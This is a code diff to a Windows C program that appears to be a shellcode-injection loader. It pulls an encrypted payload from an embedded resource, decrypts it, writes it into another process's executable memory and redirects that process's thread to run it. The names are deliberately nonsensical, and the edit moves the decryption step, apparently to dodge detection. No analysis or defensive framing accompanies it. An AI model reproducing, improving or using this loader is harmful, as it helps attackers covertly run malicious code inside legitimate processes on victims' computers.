@@ -31,7 +31,7 @@ int main() {
     DWORD codfhuLen;
     thisistheloadresou("dhanushcode56", &codfhu, &codfhuLen);
 
-    youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
+    //youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
 
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
@@ -47,7 +47,8 @@ int main() {
     GetThreadContext(pi.hThread, &ctx);
 
     LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    
+
+    youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
     WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
     ctx.Rcx = (DWORD64)dankummm; 
     SetThreadContext(pi.hThread, &ctx);
